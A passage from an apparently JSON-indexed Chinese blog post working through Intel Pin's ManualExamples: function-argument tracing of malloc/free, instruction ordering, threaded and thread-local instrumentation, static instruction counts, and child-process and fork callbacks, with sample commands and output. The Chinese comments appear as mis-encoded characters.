INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(DoLoad), IARG_UINT32, REG(INS_OperandReg(ins, 0)), IARG_MEMORYREAD_EA,IARG_RETURN_REGS, INS_OperandReg(ins, 0), IARG_END); // Delete the instruction INS_Delete(ins); } } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool demonstrates the use of SafeCopy\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // Write to a file since cout and cerr maybe closed by the application out = new std::ofstream(\"safecopy.out\"); // åˆå§‹åŒ–Pinï¼Œåˆå§‹åŒ–ç¬¦å· if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // æ³¨å†ŒEmulateLoadå‡½æ•°ä»¥è¿›è¡Œæ’æ¡© INS_AddInstrumentFunction(EmulateLoad, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:8","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"9. Order of Instrumentation Pinæä¾›äº†å¤šç§æ–¹å¼æ¥æ§åˆ¶analysis callçš„æ‰§è¡Œé¡ºåºï¼Œä¸»è¦å–å†³äºinsertion action(IPOINT)å’Œcall order(CALL_ORDER)ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-ia32/invocation.so -- obj-ia32/little_malloc $ head invocation.out After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x63a12e After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x641c76 After: IP = 0x641ca6 After: IP = 0x64bc5e Before: IP = 0x64bc5e Taken: IP = 0x648b02 æºç source/tools/ManualExamples/invocation.cppï¼š #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::dec; using std::endl; using std::hex; using std::ios; using std::ofstream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"invocation.out\", \"specify output file name\"); ofstream OutFile; /* * Analysis routines */ VOID Taken(const CONTEXT* ctxt) { ADDRINT TakenIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Taken: IP = \" \u003c\u003c hex \u003c\u003c TakenIP \u003c\u003c dec \u003c\u003c endl; } VOID Before(CONTEXT* ctxt) { ADDRINT BeforeIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Before: IP = \" \u003c\u003c hex \u003c\u003c BeforeIP \u003c\u003c dec \u003c\u003c endl; } VOID After(CONTEXT* ctxt) { ADDRINT AfterIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"After: IP = \" \u003c\u003c hex \u003c\u003c AfterIP \u003c\u003c dec \u003c\u003c endl; } /* * Instrumentation routines */ VOID ImageLoad(IMG img, VOID* v) { for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { // RTN_InsertCall()å’ŒINS_InsertCall()è°å…ˆå‡ºç°è°å…ˆæ‰§è¡Œ // åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼ŒIPOINT_AFTERåœ¨IPOINT_BEFOREä¹‹å‰æ‰§è¡Œã€‚ for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // æ‰“å¼€RTN. RTN_Open(rtn); // IPOINT_AFTERé€šè¿‡åœ¨ä¸€ä¸ªroutineä¸­å¯¹æ¯ä¸ªreturnæŒ‡ä»¤æ’æ¡©å®ç°ã€‚ // Pinä¼šå°è¯•æŸ¥æ‰¾æ‰€æœ‰çš„returnæŒ‡ä»¤ï¼Œæˆä¸æˆåŠŸåˆ™æ˜¯å¦å¤–ä¸€å›äº‹ï¼ˆæœ‰ç‚¹å¯çˆ±23333ï¼‰ã€‚ RTN_InsertCall(rtn, IPOINT_AFTER, (AFUNPTR)After, IARG_CONTEXT, IARG_END); // æ£€æŸ¥routineä¸­çš„æ¯æ¡æŒ‡ä»¤ for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { if (INS_IsRet(ins)) { // æ’æ¡©æ¯æ¡returnæŒ‡ä»¤ // IPOINT_TAKEN_BRANCHæ€»æ˜¯æœ€åä½¿ç”¨ INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)Before, IARG_CONTEXT, IARG_END); INS_InsertCall(ins, IPOINT_TAKEN_BRANCH, (AFUNPTR)Taken, IARG_CONTEXT, IARG_END); } } // å…³é—­RTN. RTN_Close(rtn); } } } VOID Fini(INT32 code, VOID* v) { OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This is the invocation pintool\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // åˆå§‹åŒ– if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // æ³¨å†ŒImageLoadå‡½æ•° IMG_AddInstrumentFunction(ImageLoad, 0); PIN_AddFiniFunction(Fini, 0); // å†™å…¥åˆ°æ–‡ä»¶ OutFile.open(KnobOutputFile.Value().c_str()); OutFile.setf(ios::showbase); // å¼€å§‹æ‰§è¡Œï¼Œæ— è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:9","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"10. Finding the Value of Function Arguments åŠŸèƒ½ï¼šä½¿ç”¨RTN_InsertCall()æŸ¥çœ‹å‡½æ•°å‚æ•° æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-intel64/malloctrace.so -- /bin/cp makefile obj-intel64/malloctrace.so.makefile.copy $ cat malloctrace.out malloc(0x5a1) returns 0x7f87d8ce2190 malloc(0x4a1) returns 0x7f87d8ce2740 malloc(0x10) returns 0x7f87d8ce2bf0 malloc(0x9d) returns 0x7f87d8ce2c00 malloc(0x28) returns 0x7f87d8ce2ca0 malloc(0x140) returns 0x7f87d8ce2cd0 malloc(0x26) returns 0x7f87d8ce2e10 free(0) malloc(0x4b0) returns 0x7f87c4428000 malloc(0x26) returns 0x7f87c44284b0 malloc(0x22) returns 0x7f87c44284e0 free(0) ... ... æºç source/tools/ManualExamples/malloctrace.cpp: #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; using std::hex; using std::ios; using std::string; /* ===================================================================== */ /* Names of malloc and free */ /* ===================================================================== */ #if defined(TARGET_MAC) #define MALLOC \"_malloc\" #define FREE \"_free\" #else #define MALLOC \"malloc\" #define FREE \"free\" #endif /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ std::ofstream TraceFile; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloctrace.out\", \"specify trace file name\"); /* ===================================================================== */ /* ===================================================================== */ /* Analysis routines */ /* ===================================================================== */ VOID Arg1Before(CHAR* name, ADDRINT size) { TraceFile \u003c\u003c name \u003c\u003c \"(\" \u003c\u003c size \u003c\u003c \")\" \u003c\u003c endl; } VOID MallocAfter(ADDRINT ret) { TraceFile \u003c\u003c \" returns \" \u003c\u003c ret \u003c\u003c endl; } /* ===================================================================== */ /* Instrumentation routines */ /* ===================================================================== */ VOID Image(IMG img, VOID* v) { // å¯¹mallocå’Œfreeå‡½æ•°è¿›è¡Œæ’æ¡©ï¼Œæ‰“å°å‡ºæ¯ä¸ªmallocæˆ–freeå‡½æ•°çš„è¾“å…¥å‚æ•°ä»¥åŠmallocçš„è¿”å›å€¼ // é¦–å…ˆï¼ŒæŸ¥æ‰¾mallocå‡½æ•° RTN mallocRtn = RTN_FindByName(img, MALLOC); if (RTN_Valid(mallocRtn)) { RTN_Open(mallocRtn); // å¯¹æŸ¥æ‰¾åˆ°çš„malloc()å‡½æ•°è¿›è¡Œæ’æ¡©æ‰“å°å…¶å‚æ•° RTN_InsertCall(mallocRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, MALLOC, IARG_FUNCARG_ENTRYPOINT_VALUE, 0,IARG_END); // æ‰“å°è¿”å›å€¼ RTN_InsertCall(mallocRtn, IPOINT_AFTER, (AFUNPTR)MallocAfter, IARG_FUNCRET_EXITPOINT_VALUE, IARG_END); RTN_Close(mallocRtn); } // æŸ¥æ‰¾free() RTN freeRtn = RTN_FindByName(img, FREE); if (RTN_Valid(freeRtn)) { RTN_Open(freeRtn); // æ’æ¡©ï¼Œæ‰“å°è¾“å…¥å‚æ•° RTN_InsertCall(freeRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, FREE, IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_END); RTN_Close(freeRtn); } } VOID Fini(INT32 code, VOID* v) { TraceFile.close(); } /* Print Help Message */ INT32 Usage() { cerr \u003c\u003c \"This tool produces a trace of calls to malloc.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // åˆå§‹åŒ– PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // å†™å…¥åˆ°æ–‡ä»¶ TraceFile.open(KnobOutputFile.Value().c_str()); TraceFile \u003c\u003c hex; TraceFile.setf(ios::showbase); // æ³¨å†ŒImageå‡½æ•° IMG_AddInstrumentFunction(Image, 0); PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:10","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"11. Instrumenting Threaded Applications åŠŸèƒ½ï¼šåœ¨åº”ç”¨å¼€å¯äº†çº¿ç¨‹ç¯å¢ƒä¸‹è¿›è¡Œæ’æ¡©ï¼Œä½¿ç”¨çš„callbackä¸ºThreadStart()å’ŒThreadFini()ã€‚åœ¨ä½¿ç”¨æ—¶ï¼Œä¸ºäº†é˜²æ­¢ä¸å…¶ä»–åˆ†æroutineå‘ç”Ÿå…±äº«èµ„æºç«äº‰çš„é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨PIN_GetLock()å‡½æ•°è¿›è¡ŒåŠ é”å¤„ç†ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-ia32/malloc_mt.so -- obj-ia32/thread_lin $ head malloc_mt.out thread begin 0 thread 0 entered malloc(24d) thread 0 entered malloc(57) thread 0 entered malloc(c) thread 0 entered malloc(3c0) thread 0 entered malloc(c) thread 0 entered malloc(58) thread 0 entered malloc(56) thread 0 entered malloc(19) thread 0 entered malloc(25c) æºç source/tools/ManualExamples/malloc_mt.cppï¼š #include \u003cstdio.h\u003e #include \"pin.H\" using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloc_mt.out\", \"specify output file name\"); //============================================================== // Analysis Routines //============================================================== // Note: threadid+1 ä½œä¸ºPIN_GetLock()çš„å‚æ•°ä½¿ç”¨ï¼Œå®ƒçš„å€¼ä¹Ÿå°±æ˜¯lockçš„å€¼ï¼Œæ‰€ä»¥ä¸èƒ½ä¸º0 // lockä¼šåºåˆ—åŒ–å¯¹è¾“å‡ºæ–‡ä»¶çš„è®¿é—®ã€‚ FILE* out; PIN_LOCK pinLock; // æ¯æ¬¡åˆ›å»ºçº¿ç¨‹ï¼Œè¯¥routineéƒ½ä¼šè¢«è°ƒç”¨æ‰§è¡Œã€‚ VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); // åŠ é” fprintf(out, \"thread begin %d\\n\", threadid); fflush(out); PIN_ReleaseLock(\u0026pinLock); // è§£é” } // æ¯æ¬¡é”€æ¯çº¿ç¨‹ï¼Œè¯¥routineéƒ½ä¼šè¢«è°ƒç”¨æ‰§è¡Œ VOID ThreadFini(THREADID threadid, const CONTEXT* ctxt, INT32 code, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread end %d code %d\\n\", threadid, code); fflush(out); PIN_ReleaseLock(\u0026pinLock); } // æ¯æ¬¡è°ƒç”¨mallocå‡½æ•°ï¼Œè¯¥routineéƒ½ä¼šè¢«è°ƒç”¨æ‰§è¡Œ VOID BeforeMalloc(int size, THREADID threadid) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread %d entered malloc(%d)\\n\", threadid, size); fflush(out); PIN_ReleaseLock(\u0026pinLock); } //==================================================================== // Instrumentation Routines //==================================================================== // å¯¹æ¯ä¸ªimageéƒ½æ‰§è¡Œ VOID ImageLoad(IMG img, VOID*) { RTN rtn = RTN_FindByName(img, \"malloc\"); if (RTN_Valid(rtn)) { RTN_Open(rtn); RTN_InsertCall(rtn, IPOINT_BEFORE, AFUNPTR(BeforeMalloc), IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_THREAD_ID, IARG_END); RTN_Close(rtn); } } // åœ¨ç»“æŸæ—¶æ‰§è¡Œä¸€æ¬¡ VOID Fini(INT32 code, VOID* v) { fclose(out); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of malloc calls in the guest application\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { // åˆå§‹åŒ–pinçš„lock PIN_InitLock(\u0026pinLock); // åˆå§‹åŒ–pin if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); out = fopen(KnobOutputFile.Value().c_str(), \"w\"); // æ³¨å†ŒImageLoadå‡½æ•° IMG_AddInstrumentFunction(ImageLoad, 0); // æ³¨å†Œçº¿ç¨‹åˆ›å»ºæˆ–ç»“æŸæ—¶çš„åˆ†æroutine PIN_AddThreadStartFunction(ThreadStart, 0); PIN_AddThreadFiniFunction(ThreadFini, 0); // æ³¨å†Œç¨‹åºé€€å‡ºæ—¶çš„finiå‡½æ•° PIN_AddFiniFunction(Fini, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:11","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"12. Using TLS(Thread Local Storage) åŠŸèƒ½ï¼šå¯ä»¥ä½¿å·¥å…·åˆ›å»ºçº¿ç¨‹ç‰¹å®šçš„æ•°æ® æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ ../../../pin -t obj-ia32/inscount_tls.so -- obj-ia32/thread_lin $ head Count[0]= 237993 Count[1]= 213296 Count[2]= 209223 Count[3]= 209223 Count[4]= 209223 Count[5]= 209223 Count[6]= 209223 Count[7]= 209223 Count[8]= 209223 Count[9]= 209223 æºç source/tools/ManualExamples/inscount_tls.cppï¼š #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::cout; using std::endl; using std::ostream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"\", \"specify output file name\"); INT32 numThreads = 0; ostream* OutFile = NULL; // å¼ºåˆ¶æ¯ä¸ªçº¿ç¨‹çš„æ•°æ®å­˜å‚¨åœ¨è‡ªå·±çš„æ•°æ®ç¼“å­˜è¡Œä¸­ï¼Œç¡®ä¿å¤šçº¿ç¨‹ä¸ä¼šå‘ç”ŸåŒä¸€æ•°æ®ç¼“å­˜è¡Œçš„ç«äº‰é—®é¢˜ã€‚ // é¿å…é”™è¯¯å…±äº«çš„é—®é¢˜ã€‚ #define PADSIZE 56 // 64 byte line size: 64-8 // è¿è¡Œçš„æŒ‡ä»¤è®¡æ•° class thread_data_t { public: thread_data_t() : _count(0) {} UINT64 _count; UINT8 _pad[PADSIZE]; }; // å­˜å‚¨åœ¨çº¿ç¨‹ä¸­çš„è®¿é—®TLSçš„keyï¼Œåªåœ¨mainå‡½æ•°ä¸­åˆå§‹åŒ–ä¸€æ¬¡ static TLS_KEY tls_key = INVALID_TLS_KEY; // è¯¥å‡½æ•°åœ¨æ¯ä¸ªblockå‰è°ƒç”¨ VOID PIN_FAST_ANALYSIS_CALL docount(UINT32 c, THREADID threadid) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadid)); tdata-\u003e_count += c; } VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { numThreads++; thread_data_t* tdata = new thread_data_t; if (PIN_SetThreadData(tls_key, tdata, threadid) == FALSE) { cerr \u003c\u003c \"PIN_SetThreadData failed\" \u003c\u003c endl; PIN_ExitProcess(1); } } // é‡åˆ°æ–°çš„ä»£ç å—æ—¶è°ƒç”¨ï¼Œæ’å…¥å¯¹docountå‡½æ•°çš„è°ƒç”¨ VOID Trace(TRACE trace, VOID* v) { // æ£€æŸ¥traceä¸­çš„æ¯ä¸ªåŸºæœ¬å— for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // å¯¹æ¯ä¸ªbblæ’å…¥å¯¹docountçš„è°ƒç”¨ï¼Œå¹¶ä¼ é€’å‚æ•°ï¼šæŒ‡ä»¤çš„æ•°é‡ BBL_InsertCall(bbl, IPOINT_ANYWHERE, (AFUNPTR)docount, IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_THREAD_ID, IARG_END); } } // çº¿ç¨‹é€€å‡ºæ—¶è°ƒç”¨ VOID ThreadFini(THREADID threadIndex, const CONTEXT* ctxt, INT32 code, VOID* v) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadIndex)); *OutFile \u003c\u003c \"Count[\" \u003c\u003c decstr(threadIndex) \u003c\u003c \"] = \" \u003c\u003c tdata-\u003e_count \u003c\u003c endl; delete tdata; } // ç¨‹åºé€€å‡ºæ—¶è°ƒç”¨ VOID Fini(INT32 code, VOID* v) { *OutFile \u003c\u003c \"Total number of threads = \" \u003c\u003c numThreads \u003c\u003c endl; } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return 1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) return Usage(); OutFile = KnobOutputFile.Value().empty() ? \u0026cout : new std::ofstream(KnobOutputFile.Value().c_str()); // è®¾ç½®key tls_key = PIN_CreateThreadDataKey(NULL); if (tls_key == INVALID_TLS_KEY) { cerr \u003c\u003c \"number of already allocated keys reached the MAX_CLIENT_TLS_KEYS limit\" \u003c\u003c endl; PIN_ExitProcess(1); } // æ³¨å†Œçº¿ç¨‹åˆ›å»ºæ—¶è°ƒç”¨çš„ThreadStartå‡½æ•° PIN_AddThreadStartFunction(ThreadStart, NULL); // æ³¨å†Œçº¿ç¨‹ç»“æŸæ—¶è°ƒç”¨çš„ThreadFiniå‡½æ•° PIN_AddThreadFiniFunction(ThreadFini, NULL); // æ³¨å†Œç¨‹åºç»“æŸæ—¶çš„Finiå‡½æ•° PIN_AddFiniFunction(Fini, NULL); // æ³¨å†ŒæŒ‡ä»¤æ’æ¡©æ—¶è°ƒç”¨çš„Traceå‡½æ•° TRACE_AddInstrumentFunction(Trace, NULL); // Start the program, never returns PIN_StartProgram(); return 1; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:12","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"13. Finding the Static Properties of an Image åŠŸèƒ½ï¼šä¸å¯¹binaryæ–‡ä»¶è¿›è¡Œæ’æ¡©ï¼Œé™æ€è·å–æ–‡ä»¶çš„æŒ‡ä»¤æ•°é‡ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š æºç source/tools/ManualExamples/staticcount.cppï¼š // // This tool prints a trace of image load and unload events // #include \u003cstdio.h\u003e #include \u003ciostream\u003e #include \"pin.H\" using std::cerr; using std::endl; // åœ¨imgåŠ è½½æ—¶è°ƒç”¨è¯¥å‡½æ•°ï¼Œè®¡ç®—imageä¸­çš„é™æ€æŒ‡ä»¤æ•°é‡ VOID ImageLoad(IMG img, VOID* v) { UINT32 count = 0; for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // å‡†å¤‡å¤„ç†RTNï¼ŒRTNå¹¶ä¸ä¼šåˆ†è§£æˆbblï¼Œåªæ˜¯INSçš„ä¸€ä¸ªåºåˆ— RTN_Open(rtn); for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { count++; } // åœ¨å¤„ç†å®Œä¸RTNç›¸å…³çš„æ•°æ®åå°±è¿›è¡Œé‡Šæ”¾ï¼Œä»¥èŠ‚çœç©ºé—´ RTN_Close(rtn); } } fprintf(stderr, \"Image %s has %d instructions\\n\", IMG_Name(img).c_str(), count); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool prints a log of image load and unload events\" \u003c\u003c endl; cerr \u003c\u003c \" along with static instruction counts for each image.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // åˆå§‹åŒ–ç¬¦å· PIN_InitSymbols(); // åˆå§‹åŒ–pin if (PIN_Init(argc, argv)) return Usage(); // æ³¨å†ŒimgåŠ è½½åè¦è°ƒç”¨çš„ImageLoadå‡½æ•° IMG_AddInstrumentFunction(ImageLoad, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:13","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"14. Instrumenting Child Processes åŠŸèƒ½ï¼šåœ¨é€šè¿‡execvç±»å‘½ä»¤è·å¾—è¿›ç¨‹å¼€å§‹å‰æ‰§è¡Œè‡ªå®šä¹‰çš„å‡½æ•°ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼šåœ¨æ‰§è¡Œæ—¶æ·»åŠ -follow_execvé€‰é¡¹ã€‚ $ ../../../pin -follow_execv -t obj-intel64/follow_child_tool.so -- obj-intel64/follow_child_app1 obj-intel64/follow_child_app2 $ make follow_child_tool.test æºç source/tools/ManualExamples/follow_child_tool.cppï¼š #include \"pin.H\" #include \u003ciostream\u003e #include \u003cstdio.h\u003e #include \u003cunistd.h\u003e /* ===================================================================== */ /* Command line Switches */ /* ===================================================================== */ BOOL FollowChild(CHILD_PROCESS cProcess, VOID* userData) { fprintf(stdout, \"before child:%u\\n\", getpid()); return TRUE; } /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { PIN_Init(argc, argv); // æ³¨å†Œå­è¿›ç¨‹åˆšåˆ›å»ºæ—¶è¦æ‰§è¡Œçš„FollowChildå‡½æ•° PIN_AddFollowChildProcessFunction(FollowChild, 0); // å¼€å§‹æ‰§è¡Œï¼Œä¸è¿”å› PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:14","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"15. Instrumenting Before and After Forks åŠŸèƒ½ï¼šä½¿ç”¨PIN_AddForkFunction()å’ŒPIN_AddForkFunctionProbed()å›è°ƒå‡½æ•°æ¥åœ¨ä»¥ä¸‹çš„FPOINTå¤„æ‰§è¡Œè‡ªå®šä¹‰å‡½æ•°ï¼š FPOINT_BEFORE Call-back in parent, just before fork. FPOINT_AFTER_IN_PARENT Call-back in parent, immediately after fork. FPOINT_AFTER_IN_CHILD Call-back in child, immediately after fork. PIN_AddForkFunction()å·¥ä½œåœ¨JITæ¨¡å¼ä¸‹ï¼ŒPIN_AddForkFunctionProbed()å·¥ä½œåœ¨Probeæ¨¡å¼ä¸‹ã€‚ æ‰§è¡Œå’ŒæŸ¥çœ‹è¾“å‡ºï¼š $ make fork_jit_tool.test æºç source/tools/ManualExamples/fork_jit_tool.cppï¼š #include \u003cstdio.h\u003e #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdlib.h\u003e #include \"pin.H\" #include \u003ciostream\u003e #include \u003cfstream\u003e using std::cerr; using std::endl; INT32 Usage() { cerr \u003c\u003c \"This pin tool registers callbacks around fork().\\n\" \"\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary(); cerr \u003c\u003c endl; return -1; } pid_t parent_pid; PIN_LOCK pinLock; VOID BeforeFork(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: Before fork.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); parent_pid = PIN_GetPid(); } VOID AfterForkInParent(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in parent.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if (PIN_GetPid() != parent_pid) { cerr \u003c\u003c \"PIN_GetPid() fails in parent process\" \u003c\u003c endl; exit(-1); } } VOID AfterForkInChild(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in child.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if ((PIN_GetPid() == parent_pid) || (getppid() != parent_pid)) { cerr \u003c\u003c \"PIN_GetPid() fails in child process\" \u003c\u003c endl; exit(-1); } } int main(INT32 argc, CHAR** argv) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // Initialize the pin lock PIN_InitLock(\u0026pinLock); // Register a notification handler that is called when the application // forks a new process. PIN_AddForkFunction(FPOINT_BEFORE, BeforeFork, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_PARENT, AfterForkInParent, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_CHILD, AfterForkInChild, 0); // Never returns PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:3:15","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 